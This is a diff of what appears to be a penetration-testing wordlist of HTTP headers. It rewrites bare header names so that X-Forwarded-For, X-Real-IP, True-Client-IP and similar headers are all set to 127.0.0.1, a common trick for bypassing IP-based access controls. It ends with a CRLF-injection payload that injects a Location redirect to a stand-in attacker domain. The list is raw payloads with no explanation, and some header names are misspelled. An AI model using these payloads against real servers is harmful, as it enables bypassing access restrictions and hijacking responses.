@@ -1,26 +1,25 @@
-X-Forwarded-For
-X-Real-IP
-X-Wap-Profile  webrtc
-Content-Type mime
+REMOTE_ADDR: 127.0.0.1
+Real_ip: 127.0.0.1
+X-Forwarded-For: 127.0.0.1
 x-forwarded-for: 127.0.0.1
 x-remote-IP: 127.0.0.1
 x-remote-ip: 127.0.0.1
 x-client-ip: 127.0.0.1
 x-client-IP: 127.0.0.1
 X-Real-IP: 127.0.0.1
-X-Forwarded-Host
-X-Remote-IP
-X-Remote-Addr
-X-Originating-IP
-True-Client-IP
-Client-IP
-X-Client-IP
-X-Real-IP
-Orgion
-Vary
-Referer：无法
-X-Host
-X-Forwarded-Server:
-X-Forwarded-Scheme
-X-Original-URL
+X-Forwarded-Host: 127.0.0.1
+X-Remote-IP: 127.0.0.1
+X-Remote-Addr: 127.0.0.1
+X-Originating-IP: 127.0.0.1
+True-Client-IP: 127.0.0.1
+Client-IP: 127.0.0.1
+X-Client-IP: 127.0.0.1
+X-Real-IP: 127.0.0.1
+Orgion: 127.0.0.1
+Vary: 127.0.0.1
+Referer: 127.0.0.1
+X-Host: 127.0.0.1
+X-Forwarded-Server: 127.0.0.1
+X-Forwarded-Scheme: 127.0.0.1
+X-Original-URL: 127.0.0.1
 %0a%0dLocation:%20http://evail.com
